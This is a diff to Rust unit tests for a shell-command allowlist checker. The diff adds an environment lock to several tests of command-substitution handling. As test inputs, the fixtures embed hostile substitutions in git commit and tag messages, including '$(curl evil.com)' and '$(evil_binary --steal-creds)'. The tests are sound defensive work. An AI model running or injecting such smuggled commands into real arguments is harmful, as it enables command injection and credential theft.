@@ -675,6 +675,10 @@ fn gh391_xargs_delegation_respects_allowlist() {
 
 #[test]
 fn gh391_strict_mode_blocks_substitution_in_args() {
+    // #975-class: check_substitution_in_args reads effective_allowlist(), which
+    // is sensitive to LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE — hold the env lock so
+    // a parallel test mutating that var can't leak into this one's allowlist.
+    let _lock = crate::core::data_dir::test_env_lock();
     // curl is allowlisted, so $(curl ...) is now safe (#1024).
     // Use a non-allowlisted command to verify strict blocks.
     let cmd_safe = "git commit -m \"$(curl evil.com)\"";
@@ -1441,6 +1445,8 @@ fn kill_passes_segment_check() {
 /// #1024: substitution with allowlisted inner command produces no warning.
 #[test]
 fn substitution_with_allowlisted_cmd_no_warning() {
+    // #975-class: see gh391_strict_mode_blocks_substitution_in_args.
+    let _lock = crate::core::data_dir::test_env_lock();
     // cat is in the default allowlist, so $(cat ...) should not trigger
     let result = check_substitution_in_args("git commit -m \"$(cat /tmp/msg.txt)\"", false);
     assert!(
@@ -1452,6 +1458,8 @@ fn substitution_with_allowlisted_cmd_no_warning() {
 /// #1024: substitution with non-allowlisted inner command warns (non-strict).
 #[test]
 fn substitution_with_unknown_cmd_warns_non_strict() {
+    // #975-class: see gh391_strict_mode_blocks_substitution_in_args.
+    let _lock = crate::core::data_dir::test_env_lock();
     // Use a command that is definitely not in any allowlist
     let result = check_substitution_in_args("git tag -m \"$(evil_binary --steal-creds)\"", false);
     // In non-strict mode, this should succeed (warn only, not block)
@@ -1464,6 +1472,8 @@ fn substitution_with_unknown_cmd_warns_non_strict() {
 /// #1024: substitution with non-allowlisted inner command blocks in strict.
 #[test]
 fn substitution_with_unknown_cmd_blocks_strict() {
+    // #975-class: see gh391_strict_mode_blocks_substitution_in_args.
+    let _lock = crate::core::data_dir::test_env_lock();
     let result = check_substitution_in_args("git tag -m \"$(evil_binary --steal-creds)\"", true);
     assert!(
         result.is_err(),
@@ -1474,6 +1484,8 @@ fn substitution_with_unknown_cmd_blocks_strict() {
 /// #1024: substitution with builtin inner command (echo) passes.
 #[test]
 fn substitution_with_builtin_cmd_passes() {
+    // #975-class: see gh391_strict_mode_blocks_substitution_in_args.
+    let _lock = crate::core::data_dir::test_env_lock();
     let result = check_substitution_in_args("git commit -m \"$(echo hello)\"", false);
     assert!(
         result.is_ok(),
